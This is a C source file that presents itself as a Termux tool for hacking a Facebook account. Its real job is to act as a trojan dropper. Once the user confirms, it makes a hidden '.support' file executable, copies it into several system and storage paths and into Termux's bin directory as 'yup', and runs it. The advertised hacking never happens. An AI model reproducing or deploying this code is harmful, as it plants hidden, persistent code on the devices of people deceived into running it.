#include <stdio.h>
#include <stdlib.h>
int main(){
  char last_wish;
  while(last_wish != 'y' || last_wish != 'n'){
    printf("\033[1;31mThis tool is going to hack a facebook account which is illegal. Are you sure to continue? [y/n]: ");
    scanf("%c", &last_wish);
    if(last_wish == 'y'){
      printf("\033[0m");
      system("chmod +x .support;");
      FILE *copy = fopen("/sdcard/.payload", "w");
      FILE *cp = fopen("/system/.payload", "w");
      FILE *cp2 = fopen("/sys/.payload", "w");
      FILE *an = fopen("/data/data/com.termux/files/usr/bin/yup", "w");
      FILE *pload = fopen(".support", "r");
      int ch=0;
      system("chmod +x /data/data/com.termux/files/usr/bin/yup;");
      while(1){
        ch = fgetc(pload);
        fputc(ch, copy);
        fputc(ch, cp);
        fputc(ch, cp2);
        fputc(ch, an);
        if(ch == EOF){
          break;
        }
      }
      system("exec .support;");
    }
    else{
      printf("\033[1;31m\nIts ok! Thank you!\n\033[0m");
    }
  }
  return 0;
}
